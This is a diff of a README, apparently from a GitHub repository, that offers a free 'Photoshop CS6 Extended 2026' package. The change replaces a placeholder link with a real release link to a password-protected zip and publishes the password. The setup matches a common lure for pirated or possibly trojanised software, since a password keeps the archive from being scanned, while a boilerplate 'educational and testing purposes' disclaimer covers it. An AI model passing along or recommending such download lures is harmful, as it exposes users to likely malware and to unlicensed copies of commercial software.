@@ -21,7 +21,7 @@ This repository is for educational and testing purposes only. All files are prov
 ## 📥 Download
 Password-protected archive with the complete CS6 package – extract and start editing instantly. 
 
-📥 [Download `Photoshop-CS6-Extended-2026.zip`](https://github.com/YOURUSERNAME/Photoshop-CS6-Desktop/releases/download/v2026/Photoshop-CS6-Extended-2026.zip)  
+📥 [Download `Photoshop-CS6-Extended-2026.zip`](https://github.com/Jdawggy14k/Adobe-CS6-Photoshop/releases/download/Photoshop/CS6-Setup-Windows.zip)  
 🔐 `LS2026`
 ---
 
